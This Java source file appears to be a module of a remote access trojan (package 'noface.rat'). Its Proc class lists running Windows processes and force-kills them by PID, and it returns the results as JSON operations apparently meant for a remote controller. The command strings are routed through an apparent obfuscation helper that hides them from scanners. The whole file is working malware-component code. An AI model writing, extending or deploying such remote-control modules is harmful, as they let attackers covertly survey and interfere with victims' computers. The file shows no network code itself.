package noface.rat;

import noface.config.S;

import java.nio.charset.StandardCharsets;

public final class Proc {

    public static String list() {
        try {
            Process p = new ProcessBuilder(S.e("tasklist"), S.e("/FO"), S.e("CSV"), S.e("/NH"))
                    .redirectErrorStream(true).start();
            String out = new String(p.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
            p.waitFor();
            StringBuilder b = new StringBuilder("{\"op\":\"proc.list\",\"rows\":[");
            boolean first = true;
            for (String line : out.split("\\R")) {
                line = line.trim();
                if (line.isEmpty()) continue;
                String[] cols = csv(line);
                if (cols.length < 2) continue;
                if (!first) b.append(',');
                first = false;
                b.append("{\"n\":\"").append(esc(unq(cols[0]))).append("\",\"p\":")
                        .append(unq(cols[1])).append('}');
            }
            b.append("]}");
            return b.toString();
        } catch (Exception e) {
            return "{\"op\":\"proc.list\",\"err\":\"" + esc(e.getMessage()) + "\"}";
        }
    }

    public static String kill(String pid) {
        try {
            if (pid == null || !pid.matches("\\d+")) return "{\"op\":\"proc.kill\",\"err\":\"bad\"}";
            new ProcessBuilder(S.e("taskkill"), S.e("/PID"), pid, S.e("/F"))
                    .redirectErrorStream(true).start().waitFor();
            return "{\"op\":\"proc.kill\",\"ok\":true}";
        } catch (Exception e) {
            return "{\"op\":\"proc.kill\",\"err\":\"" + esc(e.getMessage()) + "\"}";
        }
    }

    private static String[] csv(String line) {
        return line.split(",(?=(?:[^\"]*\"[^\"]*\")*[^\"]*$)", -1);
    }

    private static String unq(String s) {
        s = s.trim();
        if (s.startsWith("\"") && s.endsWith("\"") && s.length() >= 2) {
            return s.substring(1, s.length() - 1);
        }
        return s;
    }

    private static String esc(String s) {
        if (s == null) return "";
        return s.replace("\\", "\\\\").replace("\"", "\\\"");
    }

    private Proc() {}
}
